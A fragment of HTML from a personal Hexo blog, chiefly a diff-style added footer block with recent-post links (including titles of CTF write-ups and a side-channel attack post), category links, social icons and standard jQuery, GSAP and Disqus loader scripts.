fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+        </div>
+    </div>
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    拒绝划水，拒绝摸鱼
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2023%E5%A4%8D%E7%9B%98/">2023复盘</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/">侧信道攻击</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">蓝帽杯半决赛wp_电子取证部分</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/">蓝帽杯半决赛wp_web部分</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/CSS/">CSS</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/CSS/ing/">ing</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/Hadoop/">Hadoop</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/ing/">ing</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://dezhoutorizhao.github.io/blog6/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-telegram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://dezhoutorizhao.github.io/blog6/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://dezhoutorizhao.github.io/blog6/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:a18888200398@163.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'klugjotest';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+
+</html>
